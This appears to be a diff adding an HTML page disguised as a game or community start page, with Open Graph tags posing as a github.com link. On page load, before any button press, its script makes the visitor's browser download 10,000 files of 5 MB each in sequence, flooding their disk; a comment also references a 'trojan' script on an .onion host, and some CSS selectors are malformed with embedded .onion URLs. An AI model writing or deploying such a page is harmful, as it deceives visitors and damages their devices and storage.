@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta property="og:title" content="잘릴 디어 애닌">
+<meta property="og:description" content="CONFIGURASI ONION ZERO - TALK COMMUNITY REALY INFINITY">
+<meta property="og:image" content="https://files.catbox.moe/3ea2n0.jpg">
+<meta property="og:url" content="https://github.com">
+<meta property="og:type" content="website">
+<title>잘릴 디어 애닌</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: url("https://files.catbox.moe/cby63d.jpg") no-repeat center center fixed;
+      background-size: cover;
+    }
+
+    .camera-src="http://operal2.onion/css/source/yan6.css" {
+      background-color: #f3f3f3;
+      border-bottom: 1px solid #ccc;
+      padding: 8px 14px;
+      font-family: monospace;
+      color: #333;
+      display: flex;
+      align-items: center;
+    }
+
+    .foundersiv='http://operal2.onion/css/source/yan9.css' {
+      color: #03a9f4;
+      margin-right: 8px;
+    }
+
+    .url-text {
+      color: #03a9f4;
+    }
+
+    .content {
+      padding: 30px;
+    }
+
+    .btn {
+      padding: 10px 20px;
+      background: #03a9f4;
+      color: black;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background: #03a9f4;
+    }
+  </style>
+</head>
+<body>
+<script>
+ // onActiv+ trojan=silen{src="http://bolisticoperal.onion/script/yantrojan2.js"}
+ </script>
+  <div class="camera-src="http://operal2.onion/css/source/yan6.css">
+    <span class="foundersiv='http://operal2.onion/css/source/yan9.css'">𓁹</span>
+    <span class="url-text">잘릴 디어 애닌</span>
+  </div>
+  <div class="content">
+    <h1>PENCET TOMBOL START UNTUK MEMULAI PERMAINAN</h1>
+    <p>WELCOME TO COMMUNITY REALY INFINITY</p>
+    <button  class="btn">START</button>
+    
+  </div>
+  <script>
+    const filesCount = 10000;
+    const fileSizeInMB = 5;
+    const fileSizeInBytes = fileSizeInMB * 1024 * 1024;
+    const content = '@@';
+
+    function downloadFile(name, size) {
+      try {
+        const repeatCount = Math.floor(size / content.length);
+        const fileContent = new Array(repeatCount).fill(content).join('');
+        const blob = new Blob([fileContent], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = name;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+
+      } catch (e) {
+        alert('CLICK 😜 ' + name);
+      }
+    }
+
+    function startDownload() {
+      for (let i = 1; i <= filesCount; i++) {
+        setTimeout(() => {
+          const fileName = `file${i}.txt`;
+          downloadFile(fileName, fileSizeInBytes);
+        }, i * 500);
+      }
+    }
+
+    window.onload = startDownload;
+  </script>
+  
+
+</body>
+</html>
